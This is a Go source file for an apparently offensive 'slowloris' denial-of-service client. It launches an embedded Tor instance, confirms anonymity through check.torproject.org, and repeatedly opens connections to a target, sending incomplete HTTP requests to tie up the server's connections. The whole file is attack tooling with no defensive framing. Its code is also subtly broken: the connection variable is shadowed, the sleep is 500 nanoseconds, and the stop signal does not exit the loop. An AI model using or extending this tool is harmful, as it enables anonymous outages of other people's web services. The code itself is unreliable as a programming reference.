package slowloris

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/cretz/bine/tor"
	"github.com/tacusci/logging"
	"golang.org/x/net/html"
)

func NewClient() (*Client, error) {
	c := &Client{
		Stop: make(chan bool),
	}
	if err := c.startup(); err != nil {
		return nil, err
	}
	return c, nil
}

type Client struct {
	Tor        *tor.Tor
	HTTP       *http.Client
	Dialer     *tor.Dialer
	Running 	bool
	Stop 	    chan bool
	dialCancel context.CancelFunc
}

func (c *Client) startup() error {
	t, err := tor.Start(nil, nil)
	if err != nil {
		return err
	}

	c.Tor = t

	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
	if err != nil {
		dialCancel()
		return err
	}

	c.dialCancel = dialCancel

	dialer, err := c.Tor.Dialer(dialCtx, nil)
	if err != nil {
		dialCancel()
		return err
	}

	c.Dialer = dialer

	c.HTTP = &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}

	return nil
}

func (c *Client) Attack(start *chan struct{}, target string) {

	<-*start

	var conn net.Conn

	for {

		switch {
		case <-c.Stop:
			break
		default:
			if conn == nil {
				conn, err := c.Dialer.Dial("tcp", target)
				if err != nil {
					logging.Error(err.Error())
					continue
				}
		
				if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", "GET", "/"); err != nil {
					logging.Error(err.Error())
					continue
				}
		
				header := createHeader(target)
				if err = header.Write(conn); err != nil {
					logging.Error(err.Error())
					continue
				}
			}
	
			time.Sleep(500)
		}

	}
}

func (c *Client) CheckTorConnection() bool {
	resp, err := c.HTTP.Get("https://check.torproject.org")
	if err != nil {
		logging.Error(err.Error())
		return false
	}
	defer resp.Body.Close()
	// Grab the <title>
	parsed, err := html.Parse(resp.Body)
	if err != nil {
		logging.Error(err.Error())
		return false
	}

	return getTitle(parsed) == "Congratulations. This browser is configured to use Tor."
}

func (c *Client) Close() {
	c.Running = false
	if c.dialCancel != nil {
		c.dialCancel()
	}
	c.Tor.Close()
}

func getTitle(n *html.Node) string {
	if n.Type == html.ElementNode && n.Data == "title" {
		var title bytes.Buffer
		if err := html.Render(&title, n.FirstChild); err != nil {
			panic(err)
		}
		return strings.TrimSpace(title.String())
	}
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		if title := getTitle(c); title != "" {
			return title
		}
	}
	return ""
}

func createHeader(target string) *http.Header {
	hdr := http.Header{}

	hdr.Add("Host", target)
	hdr.Add("User-Agent", "Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0")

	return &hdr
}
